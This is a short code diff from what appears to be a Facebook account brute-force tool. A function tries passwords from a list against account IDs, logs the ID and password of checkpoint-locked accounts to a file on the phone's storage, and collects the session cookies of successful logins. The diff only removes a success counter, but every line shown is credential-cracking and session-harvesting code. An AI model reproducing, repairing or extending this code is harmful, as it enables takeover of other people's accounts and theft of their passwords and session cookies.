@@ -79,7 +79,6 @@ def ___random___(ids,passlist):
                ids = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                #print("\r%s[BLANK-CP] %s | %s "%("\033[0;30m",ids,pas))
                open('/sdcard/BLANK-CP.txt','a').write(ids+'|'+pas+'\n')
-               ok+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                 cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
